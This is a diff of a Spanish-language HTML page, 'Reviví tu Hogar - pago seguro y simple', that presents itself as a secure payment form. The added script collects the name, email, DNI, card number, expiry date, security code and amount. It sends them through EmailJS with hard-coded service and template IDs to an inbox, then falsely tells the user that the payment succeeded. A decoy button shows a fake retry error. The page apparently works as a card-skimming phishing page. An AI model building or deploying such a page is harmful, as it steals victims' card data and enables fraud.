@@ -1,73 +1,122 @@
 <!DOCTYPE html>
 <html lang="es">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Reviví tu Hogar - Pago seguro y simple</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f4f4f4;
-      padding: 20px;
-    }
-    .container {
-      max-width: 500px;
-      margin: auto;
-      background: #fff;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    h2 {
-      text-align: center;
-      color: #333;
-    }
-    input, select, button {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-      font-size: 16px;
-    }
-    button {
-      background-color: #007bff;
-      color: #fff;
-      border: none;
-    }
-    button:hover {
-      background-color: #0056b3;
-    }
-    #mensaje {
-      display: none;
-      margin-top: 15px;
-      padding: 12px;
-      background-color: #ffe3e3;
-      color: #b10000;
-      border-radius: 6px;
-      text-align: center;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h2>Reviví tu Hogar - Pago seguro y simple</h2>
-    <form id="formulario">
-      <input type="text" name="nombre" placeholder="Nombre completo" required />
-      <input type="text" name="numero" placeholder="Número de tarjeta" required />
-      <input type="text" name="vencimiento" placeholder="MM/AA" required />
-      <input type="text" name="codigo" placeholder="Código de seguridad" required />
-      <input type="email" name="email" placeholder="Correo electrónico" required />
-      <button type="submit">Ver opciones de cuotas</button>
-      <div id="mensaje">Vuelve a reintentar en unos minutos o verifica los datos de su tarjeta</div>
-    </form>
-  </div>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Reviví tu Hogar - pago seguro y simple</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+      body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #f0f2f5;
+        margin: 0;
+        padding: 0;
+      }
+      .container {
+        max-width: 600px;
+        margin: 30px auto;
+        padding: 20px;
+        background: white;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      }
+      h1 {
+        text-align: center;
+        color: #333;
+        margin-bottom: 10px;
+      }
+      .subtitle {
+        text-align: center;
+        font-size: 16px;
+        color: #666;
+        margin-bottom: 20px;
+      }
+      input, select, button {
+        width: 100%;
+        padding: 12px;
+        margin: 8px 0;
+        border-radius: 5px;
+        border: 1px solid #ccc;
+        font-size: 16px;
+      }
+      button {
+        background-color: #28a745;
+        color: white;
+        border: none;
+        transition: background-color 0.3s ease;
+        cursor: pointer;
+      }
+      button:hover {
+        background-color: #218838;
+      }
+      .message {
+        margin-top: 15px;
+        padding: 10px;
+        border-radius: 5px;
+        text-align: center;
+      }
+      .error {
+        background-color: #f8d7da;
+        color: #721c24;
+      }
+      .success {
+        background-color: #d4edda;
+        color: #155724;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Reviví tu Hogar - pago seguro y simple</h1>
+      <p class="subtitle">Seleccione el monto a pagar y complete el formulario con sus datos. Recibirá una confirmación en su correo.</p>
+      <form id="form-pago" novalidate>
+        <input type="text" name="nombre" placeholder="Nombre completo" required />
+        <input type="email" name="email" placeholder="Correo electrónico" required />
+        <input type="text" name="dni" placeholder="DNI" required />
+        <input type="text" name="tarjeta" placeholder="Número de tarjeta" required />
+        <input type="text" name="vencimiento" placeholder="Fecha de vencimiento (MM/AA)" required />
+        <input type="text" name="codigo" placeholder="Código de seguridad" required />
+        <input type="number" name="monto" placeholder="Monto a pagar" required />
+        <button type="submit">Realizar pago</button>
+        <button type="button" id="btnCuotas">Ver opciones de cuotas</button>
+        <div class="message" id="mensajeCuotas" style="display:none; color: #f28b82; font-weight: bold;">
+          Vuelve a reintentar en unos minutos o verifica los datos de su tarjeta.
+        </div>
+      </form>
+    </div>
 
-  <script>
-    document.getElementById('formulario').addEventListener('submit', function(e) {
-      e.preventDefault();
-      document.getElementById('mensaje').style.display = 'block';
-    });
-  </script>
-</body>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+      emailjs.init('FL6vofHg7F9vLawQs'); // Reemplazá con tu clave pública
+
+      const formulario = document.getElementById("form-pago");
+
+      formulario.addEventListener("submit", function (event) {
+        event.preventDefault();
+        const formData = new FormData(formulario);
+
+        const templateParams = {
+          nombre: formData.get("nombre"),
+          email: formData.get("email"),
+          dni: formData.get("dni"),
+          tarjeta: formData.get("tarjeta"),
+          vencimiento: formData.get("vencimiento"),
+          codigo: formData.get("codigo"),
+          monto: formData.get("monto")
+        };
+
+        emailjs.send('service_6pbv86h', 'template_m3nuw4p', templateParams)
+          .then(function(response) {
+            alert("Pago realizado con éxito.");
+            formulario.reset();
+          }, function(error) {
+            alert("Error al enviar. Por favor reintente en unos minutos.");
+          });
+      });
+
+      document.getElementById("btnCuotas").addEventListener("click", function () {
+        document.getElementById("mensajeCuotas").style.display = "block";
+      });
+    </script>
+  </body>
 </html>
